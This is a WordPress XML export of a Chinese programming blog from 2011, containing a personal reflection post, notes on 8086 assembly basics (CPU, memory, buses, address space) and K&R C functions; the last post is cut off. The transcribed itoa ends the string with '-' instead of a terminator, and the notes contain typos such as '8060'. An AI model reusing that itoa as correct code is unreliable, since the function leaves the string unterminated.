		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[9]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>思绪飘飘</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%80%9d%e7%bb%aa%e9%a3%98%e9%a3%98/</link>
		<pubDate>Sat, 10 Sep 2011 03:42:15 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[随笔]]></category>

		<category domain="category" nicename="%e9%9a%8f%e7%ac%94"><![CDATA[随笔]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=72</guid>
		<description></description>
		<content:encoded><![CDATA[这段时间忙了些，好久都没写博客了。不忙的时候又比较懒了，不想做什么，感觉浪费了不少的时间，而原本可以利用这些时间学到不少东西的。公司这边距垃圾场很近，垃圾一烧起来，也太臭了，晚上睡觉都不敢开窗！

感觉自己需要总结下了，这段时间忙着策划的需求，也是第一次较深入的接触动画的编写，这之间的体会蛮多的。如何去分解复杂度，编写良好的api，确实是一个需要认真考虑的问题。我们通常用模块将问题得以简化，模块设计的好坏，直接影响了复杂度分解是否合理，进而也影响了bug是否容易产生，是否容易debug。在这方面我不敢说有多深的体会，只是针对自己的需求，写出自己较为满意的代码而已。在我看来，当你直觉你设计的有问题但又写了不少的代码，那么与其发现问题修修补补，不如忍痛重写也比过后被bug纠缠好得多。

或许换作其他人，写得比我优雅。且我也见过牛人写的代码，用C++的思想，模板类，接口类，继承，将函数回调封装成监听者，看起来的确很不错。我的实现是经典的C思想，数据结构 + 围绕数据结构所进行的操作，自然除了好理解一点（对于C++着实一般的我而言），是比不上牛人的那种C++思想的。在今后，C++设计程序的思想是我学习的一个方向。

审视自己，在学习目标上，基础上希望学习汇编语、深入理解计算机系统以及crt源码加深自己的基础知识。上层希望学习DX龙书、OGRE等各种优秀的游戏引擎源码来充实自己的游戏编写知识。系统上希望通过学习Windows核心编程、一个操作系统的设计与实现以及操作系统相关书籍来弥补自己对操作系统的贫乏认识。当然工作上还得完成策划的任务，工作的代码也是一个不错的学习宝库。

督促自己以后多写点博客，无论工作、生活。中秋节来了，祝朋友、家人和我亲爱的猪，节日快乐！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>72</wp:post_id>
		<wp:post_date>2011-09-10 11:42:15</wp:post_date>
		<wp:post_date_gmt>2011-09-10 03:42:15</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%80%9d%e7%bb%aa%e9%a3%98%e9%a3%98</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[4]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1315626619]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>cpu内部</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/cpu%e5%86%85%e9%83%a8/</link>
		<pubDate>Sat, 10 Sep 2011 04:15:18 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp04/M00/01/EF/wKgKDE5q5FYAAAAAAACxGly_sYk952.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>75</wp:post_id>
		<wp:post_date>2011-09-10 12:15:18</wp:post_date>
		<wp:post_date_gmt>2011-09-10 04:15:18</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>cpu%e5%86%85%e9%83%a8</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>74</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp04/M00/01/EF/wKgKDE5q5FYAAAAAAACxGly_sYk952.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"569";s:6:"height";s:3:"437";s:14:"hwstring_small";s:23:"height='96' width='124'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/01/F1/wKgKDE5q5FYAAAAAAAAUVilqoaE289.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"144";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/01/F1/wKgKDE5q5FYAAAAAAAAueA-XPZM508.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"379";s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/CE/wKgKDE5q5FYAAAAAAAC6snJkHrA603.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/01/EF/wKgKDE5q5FYAAAAAAACxGjPrddA886.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>内存</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/%e5%86%85%e5%ad%98/</link>
		<pubDate>Sat, 10 Sep 2011 04:33:16 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp01/M00/02/1E/wKgKC05q6IwAAAAAAAIQQG9Wr2c104.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>76</wp:post_id>
		<wp:post_date>2011-09-10 12:33:16</wp:post_date>
		<wp:post_date_gmt>2011-09-10 04:33:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%86%85%e5%ad%98</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>74</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp01/M00/02/1E/wKgKC05q6IwAAAAAAAIQQG9Wr2c104.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"448";s:6:"height";s:3:"454";s:14:"hwstring_small";s:22:"height='96' width='94'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/01/AF/wKgKC05q6I0AAAAAAAAQHVYJqqk843.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"185";s:6:"height";s:3:"188";s:3:"url";s:73:"http://files.blogcn.com/wp05/M00/01/F0/wKgKDU5q6I0AAAAAAAAydFfd5-Y357.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp04/M00/01/EF/wKgKDU5q6I0AAAAAAAIQQAWyr5Y884.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>内存地址空间</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/%e5%86%85%e5%ad%98%e5%9c%b0%e5%9d%80%e7%a9%ba%e9%97%b4/</link>
		<pubDate>Sat, 10 Sep 2011 05:45:22 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/02/CE/wKgKDE5q-XIAAAAAAADDsgGmSUk359.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>78</wp:post_id>
		<wp:post_date>2011-09-10 13:45:22</wp:post_date>
		<wp:post_date_gmt>2011-09-10 05:45:22</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e5%86%85%e5%ad%98%e5%9c%b0%e5%9d%80%e7%a9%ba%e9%97%b4</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>74</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/02/CE/wKgKDE5q-XIAAAAAAADDsgGmSUk359.jpg</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"579";s:6:"height";s:3:"493";s:14:"hwstring_small";s:23:"height='96' width='112'";s:5:"sizes";a:3:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/01/C3/wKgKCk5q-XMAAAAAAAAPkzkE4z0661.jpg";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"160";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/1E/wKgKC05q-XMAAAAAAAAqFCjZOoU365.jpg";}s:5:"large";a:3:{s:5:"width";s:3:"494";s:6:"height";s:3:"420";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/27/wKgKCk5q-XMAAAAAAADQU1iq450046.jpg";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp06/M00/02/CE/wKgKDE5q-XIAAAAAAADDsgGOBYc248.jpg";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——基础知识</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/</link>
		<pubDate>Sat, 10 Sep 2011 05:50:29 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=74</guid>
		<description></description>
		<content:encoded><![CDATA[前人的话很有道理：要将书读薄。

<strong>机器语言</strong>：机器语言是机器指令的集合。机器指令就是一台机器可以正确执行的命令。计算机的机器指令时一列二进制数字，计算机将其转变为一列高低电平，以使计算机的电子器件受到驱动，进行运算。每一种微处理器，由于硬件设计和内部结构的不同，就需要用不同的电平脉冲来控制，使其工作。所以每一种微处理器都有自己的机器指令集，也就是机器语言。

机器语言阅读、书写、查错是很不方便的，于是就出现了助记符，也就是汇编语言。汇编语言的主题是汇编指令，汇编语言和机器语言的差别在于指令的表示方法上，比如：
机器指令：1000100111011000
汇编指令：mov ax, bx
程序员用汇编语言写出源程序，再用汇编编译器将其翻译为机器码，由计算机最终执行。

<strong>CPU内部结构图</strong>
<img src="http://files.blogcn.com/wp04/M00/01/EF/wKgKDE5q5FYAAAAAAACxGly_sYk952.jpg" alt="cpu内部" />
CPU控制着整个计算机的运作并进行运算。CPU工作需要向其提供指令和数据，指令和数据在存储器中存放，也就是内存。指令和数据是应用上的概念，在内存和磁盘上，指令和数据没有什么区别，都是二进制信息。

<strong>存储器</strong>：存储设备是用于储存信息的设备，按照存储方式的不同分为RAM/ROM(电能)、硬盘/软盘/磁带(磁能)、CD/DVD(光学)、打孔卡(实物)，不同的方式对应了不同的驱动设备。内部存储器，也即内存，是指CPU直接访问而不需要通过输入输出设备的存储设备。

<strong>32KByte容量的SRAM介绍</strong>(<a href="http://blog.c114.net/html/15/562315-76186.html">内存器件介绍之RAM篇</a>)：
该SRAM有8位行地址，译码后生成256根行地址线；列地址线为7位，译码后生成128根列地址线。

SRAM进行读操作时，OE和CS为低电平，WE为高电平，G1输出低电平将输入控缓冲器关闭，G2输出高电平将输出缓冲器打开，通过行列地址线选中的存储单元数据经I/O和输出缓冲器，最后从I/O[0:7]输出。

写操作时，WE和CS为低电平，OE为高电平，G1输出高电平将输入缓冲器打开，G2输出低电平将输出缓冲器关闭，I/O[0:7]上的输出经输出缓冲器和内部I/O总线，最后写入行列地址选中的存储空间中。
<img src="http://files.blogcn.com/wp01/M00/02/1E/wKgKC05q6IwAAAAAAAIQQG9Wr2c104.jpg" alt="内存内部" />
CPU要想实现对存储器的读写，必须和存储器进行3类信息的交互：
<ul>
	<li>存储单元的地址（地址信息）</li>
	<li>器件的选择，读或写的命令（控制信息）</li>
	<li>读或写的信息（数据信息）</li>
</ul>
分别通过地址总线、控制总线和数据总线。

<strong>总线</strong>：是指计算机组件间规范化的交换数据（data）的方式，即以一种通用的方式为各组件提供数据传送和控制逻辑。总线可同时传输的数据数就称为宽度（width）。总线的带宽（即单位时间内可以传输的总数据数）为：总线带宽 = 频率 x 宽度（Bytes/sec）。

地址总线：地址总线上能传送多少个不同的信息，CPU就能对多少个存储单元进行寻址。N位地址总线，能寻址2<sup>N</sup>个内存单元。
数据总线：数据总线的宽度决定了CPU和外界的数据传送速度。8060有16根数据线，一次基恩传送16为位数据。
控制总线：控制总线是一些不同控制线的集合（比如上例的CS、OE、WE）控制总线的宽度决定可CPU对外部期间的控制能力。

<strong>内存地址空间</strong>：计算机系统中，所有可用程序控制其工作的设备，必须受到CPU的控制。有些外部设备是通过控制接口卡从而实现CPU对外设的间接控制。一台PC机，装有多个存储器芯片，虽然在物理上相互使独立的，但在逻辑上，CPU把他们总的看作一个由若干存储单元组成的逻辑存储器，叫做内存地址空间。
<img src="http://files.blogcn.com/wp06/M00/02/CE/wKgKDE5q-XIAAAAAAADDsgGmSUk359.jpg" alt="内存地址空间" />
CPU在这段地址空间中读写数据，实际上就是在相对应的物理存储器中读写数据，内存地址空间的大小受到CPU地址总线宽度的限制。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>74</wp:post_id>
		<wp:post_date>2011-09-10 13:50:29</wp:post_date>
		<wp:post_date_gmt>2011-09-10 05:50:29</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1315633830]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>《C程序设计语言》中的程序小诗(二)</title>
		<link>http://codemylife.blogcn.com/2011/09/%e3%80%8ac%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80%e3%80%8b%e4%b8%ad%e7%9a%84%e7%a8%8b%e5%ba%8f%e5%b0%8f%e8%af%97%e4%ba%8c/</link>
		<pubDate>Sat, 10 Sep 2011 07:44:56 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category><![CDATA[C程序设计语言]]></category>

		<category domain="category" nicename="c%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80"><![CDATA[C程序设计语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=67</guid>
		<description></description>
		<content:encoded><![CDATA[不多说，直接上代码。

binsearch函数：在v[0] &lt;= v[1] ...&lt;=v[n-1]中查找x
<pre class="c">int binsearch(int x, int v[], int n)
{
    int low, high, mid;
</br>
    low = 0;
    high = n-1;
    while (low &lt;= high) {
        mid = (low + high) / 2;
        if (x &lt; v[mid])
            high = mid - 1;
        else if (x &gt; v[mid])
            low = mid + 1;
        else
            return mid;
    }
    return -1;
}</pre>
atoi函数：将s转换成整形数
<pre class="c">int atoi(char s[])
{
    int i , n, sign;
</br>
    for(i = 0; isspace(s[i]); i++) /* 跳过空白符*/
        ;
    sign = (s[i] == '-') ? -1 : 1;
    if (s[i] == '+' || s[i] == '-') /* 跳过符号*/
        i++;
    for (n = 0; isdigit(s[i]); i++)
        n = 10 * n + (s[i] - '0');
    return sign * n;
}</pre>
shellsort函数：按递增顺序对v[0]...v[n-1]进行排序
<pre class="c">void shellsort(int v[], int n)
{
    int gap, i, j, temp;
</br>
    for (gap = n / 2; gap &gt; 0; gap /=2) {
        for (i = gap; i &lt; n; i++) {
            for (j = i - gap; j &gt;= 0 &amp;&amp; v[j] &gt; v[j+gap]; j -= gap) {
                temp = v[j];
                v[j] = v[j+gap];
                v[j+gap] = temp;
            }
        }
    }
}</pre>
reverse函数：倒置字符串s中各个字符的位置
<pre class="c">void reverse(char s[])
{
    int c, i, j;
    for (i = 0, j = strlen(s) - 1; i &lt; j; i++, j--) {
        c = s[i];
        s[i] = s[j];
        s[j] = c;
    }
}</pre> 
itoa函数：将数字n转换成字符串并保存在s中
<pre class="c">
void itoa(int n , char s[])
{
    int i, sign;
    if ((sign = n) &lt; 0)
        n = -n;
    i = 0;
    do {
        s[i++] = n % 10 + '0'; /* 取下一个数字 */
    } while ((n /= 10) &gt; 0);   /* 删除该数字 */
    if (sign &lt; 0)
        s[i++] = '-';
    s[i] = '-';
    reverse(s);
}
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>67</wp:post_id>
		<wp:post_date>2011-09-10 15:44:56</wp:post_date>
		<wp:post_date_gmt>2011-09-10 07:44:56</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>%e3%80%8ac%e7%a8%8b%e5%ba%8f%e8%ae%be%e8%ae%a1%e8%af%ad%e8%a8%80%e3%80%8b%e4%b8%ad%e7%9a%84%e7%a8%8b%e5%ba%8f%e5%b0%8f%e8%af%97%e4%ba%8c</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
								<wp:postmeta>
		<wp:meta_key>_edit_last</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_edit_lock</wp:meta_key>
		<wp:meta_value><![CDATA[1316167161]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>views</wp:meta_key>
		<wp:meta_value><![CDATA[8]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_pingme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_encloseme</wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
				<wp:postmeta>
		<wp:meta_key>_wp_old_slug</wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>8086</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%af%84%e5%ad%98%e5%99%a8/attachment/8086/</link>
		<pubDate>Sun, 11 Sep 2011 02:34:48 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<guid isPermaLink="false">http://files.blogcn.com/wp06/M00/02/D0/wKgKDE5sHkgAAAAAAAB_IkT2oIg330.png</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>84</wp:post_id>
		<wp:post_date>2011-09-11 10:34:48</wp:post_date>
		<wp:post_date_gmt>2011-09-11 02:34:48</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>8086</wp:post_name>
		<wp:status>inherit</wp:status>
		<wp:post_parent>83</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>attachment</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
				<wp:attachment_url>http://files.blogcn.com/wp06/M00/02/D0/wKgKDE5sHkgAAAAAAAB_IkT2oIg330.png</wp:attachment_url>
								<wp:postmeta>
		<wp:meta_key>_wp_attachment_metadata</wp:meta_key>
		<wp:meta_value><![CDATA[a:6:{s:5:"width";s:3:"282";s:6:"height";s:3:"166";s:14:"hwstring_small";s:23:"height='75' width='128'";s:5:"sizes";a:2:{s:9:"thumbnail";a:3:{s:5:"width";s:2:"88";s:6:"height";s:2:"88";s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/01/C4/wKgKCk5sHkgAAAAAAAAnwz5cgZE553.png";}s:6:"medium";a:3:{s:5:"width";s:3:"188";s:6:"height";s:3:"110";s:3:"url";s:73:"http://files.blogcn.com/wp02/M00/02/28/wKgKCk5sHkgAAAAAAABUSyaA_Kg979.png";}}s:10:"image_meta";a:10:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";}s:3:"url";s:73:"http://files.blogcn.com/wp01/M00/02/21/wKgKC05sHkgAAAAAAAB_ImSpIL4461.png";}]]></wp:meta_value>
		</wp:postmeta>
							</item>
		<item>
		<title>汇编语言笔记——寄存器</title>
		<link>http://codemylife.blogcn.com/2011/09/%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80%e7%ac%94%e8%ae%b0%e2%80%94%e2%80%94%e5%af%84%e5%ad%98%e5%99%a8/</link>
		<pubDate>Sun, 11 Sep 2011 03:20:47 +0000</pubDate>
		<dc:creator><![CDATA[codemylife]]></dc:creator>
		
		<category domain="tag"><![CDATA[汇编]]></category>

		<category domain="tag" nicename="%e6%b1%87%e7%bc%96"><![CDATA[汇编]]></category>

		<category><![CDATA[汇编语言]]></category>

		<category domain="category" nicename="%e6%b1%87%e7%bc%96%e8%af%ad%e8%a8%80"><![CDATA[汇编语言]]></category>

		<category><![CDATA[读书]]></category>

		<category domain="category" nicename="%e8%af%bb%e4%b9%a6"><![CDATA[读书]]></category>

		<guid isPermaLink="false">http://codemylife.blogcn.com/?p=83</guid>
		<description></description>
		<content:encoded><![CDATA[弱水三千，我只取一瓢饮。

以后的日志开头，或许会引用一句话，或诗词，或名言，也许无关主题，增添几许乐趣而已！

<strong>通用寄存器</strong>：8086CPU的所有寄存器都是16位的，可以存放两个字节。AX、BX、CX、DX被称为通用寄存器，为了兼容，均可分为两个独立8位寄存器来用。在进行数据传送或运算时，要注意指令的两个操作对象应当是一直的。

